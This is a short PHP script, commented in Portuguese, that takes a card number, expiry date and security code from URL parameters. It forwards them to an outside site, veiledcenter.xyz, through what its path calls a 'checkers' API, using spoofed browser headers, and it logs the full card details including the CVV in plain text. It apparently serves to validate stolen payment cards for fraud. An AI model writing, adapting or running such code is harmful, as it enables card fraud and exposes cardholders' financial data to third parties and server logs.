<?php

// Obter parâmetros da URL
$numeroCartao = isset($_GET['numeroCartao']) ? urlencode($_GET['numeroCartao']) : '';
$mesExpiracao = isset($_GET['mesExpiracao']) ? urlencode($_GET['mesExpiracao']) : '';
$anoExpiracao = isset($_GET['anoExpiracao']) ? urlencode($_GET['anoExpiracao']) : '';
$codigoSeguranca = isset($_GET['codigoSeguranca']) ? urlencode($_GET['codigoSeguranca']) : '';

// Certificar-se de que todos os parâmetros necessários foram fornecidos
if ($numeroCartao && $mesExpiracao && $anoExpiracao && $codigoSeguranca) {
    $url = "https://veiledcenter.xyz/dashboard/checkers/consulta/api.php?lista={$numeroCartao}|{$mesExpiracao}|{$anoExpiracao}|{$codigoSeguranca}";

    $ch = curl_init();

    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
    curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

    $headers = array(
        'Authority: veiledcenter.xyz',
        'Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
        'Accept-Language: pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
        'Sec-Ch-Ua: ^^Google',
        'Sec-Ch-Ua-Mobile: ?0',
        'Sec-Ch-Ua-Platform: ^^Windows^^\"\"',
        'Sec-Fetch-Dest: image',
        'Sec-Fetch-Mode: no-cors',
        'Sec-Fetch-Site: same-origin',
        'Sec-Fetch-User: ?1',
        'Upgrade-Insecure-Requests: 1',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
        "Referer: https://veiledcenter.xyz/dashboard/checkers/consulta/api.php?lista={$numeroCartao}^|{$mesExpiracao}^|{$anoExpiracao}^|{$codigoSeguranca}"
    );

    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

    $result = curl_exec($ch);

    if (curl_errno($ch)) {
        echo 'Error:' . curl_error($ch);
    } else {
        // Retorna a resposta da API
        echo $result;
    }

    curl_close($ch);
} else {
    // Se algum parâmetro estiver faltando, retorna uma mensagem de erro
    echo 'Erro: Parâmetros incompletos.';
}

// Mensagens de log
error_log("Número do Cartão: $numeroCartao, Mês de Expiração: $mesExpiracao, Ano de Expiração: $anoExpiracao, Código de Segurança: $codigoSeguranca");

?>
